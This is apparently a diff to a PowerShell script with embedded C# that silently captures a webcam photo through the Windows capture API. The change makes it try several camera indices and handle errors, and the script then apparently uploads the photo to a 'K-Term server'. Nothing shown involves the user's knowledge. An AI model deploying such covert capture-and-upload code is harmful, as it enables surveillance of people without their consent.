@@ -33,29 +33,36 @@ Function Capture-Webcam {
         [DllImport("user32.dll")]
         public static extern bool DestroyWindow(IntPtr hWnd);
 
-        public static bool Capture(string filePath) {
+        public static bool Capture(string filePath, int cameraIndex) {
             IntPtr hWnd = capCreateCaptureWindowA("Webcam", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
             if (hWnd == IntPtr.Zero) return false;
 
-            SendMessage(hWnd, 0x0400 + 10, 0, 0); // WM_CAP_DRIVER_CONNECT
+            bool connected = SendMessage(hWnd, 0x0400 + 10, cameraIndex, 0); // WM_CAP_DRIVER_CONNECT
+            if (!connected) {
+                DestroyWindow(hWnd);
+                return false;
+            }
+
             SendMessage(hWnd, 0x0400 + 50, 1, 0); // WM_CAP_SET_PREVIEW
             SendMessage(hWnd, 0x0400 + 52, 30, 0); // WM_CAP_SET_PREVIEWRATE
-            System.Threading.Thread.Sleep(900);    // Warm up camera sensor
+            System.Threading.Thread.Sleep(1500);   // Warm up camera sensor & auto-exposure
 
             SendMessage(hWnd, 0x0400 + 60, 0, 0); // WM_CAP_GRAB_FRAME
-            System.Threading.Thread.Sleep(300);
+            System.Threading.Thread.Sleep(500);
             SendMessage(hWnd, 0x0400 + 41, 0, 0); // WM_CAP_EDIT_COPY
             
+            bool success = false;
             try {
                 Image img = System.Windows.Forms.Clipboard.GetImage();
                 if (img != null) {
                     img.Save(filePath, ImageFormat.Jpeg);
+                    success = true;
                 }
-            } catch { return false; }
+            } catch { success = false; }
 
             SendMessage(hWnd, 0x0400 + 11, 0, 0); // WM_CAP_DRIVER_DISCONNECT
             DestroyWindow(hWnd);
-            return true;
+            return success;
         }
     }
 "@
@@ -63,12 +70,14 @@ Function Capture-Webcam {
     Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
     Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing, System.Windows.Forms -ErrorAction SilentlyContinue
 
-    $result = [WebCamCapture]::Capture($tempFile)
-    if ($result -and (Test-Path $tempFile)) {
-        return $tempFile
-    } else {
-        return $null
+    # Try available camera indices (0 = Primary, 1 = Secondary / External USB, 2 = Tertiary)
+    for ($i = 0; $i -le 2; $i++) {
+        $result = [WebCamCapture]::Capture($tempFile, $i)
+        if ($result -and (Test-Path $tempFile)) {
+            return $tempFile
+        }
     }
+    return $null
 }
 
 # Function to upload photo to K-Term server
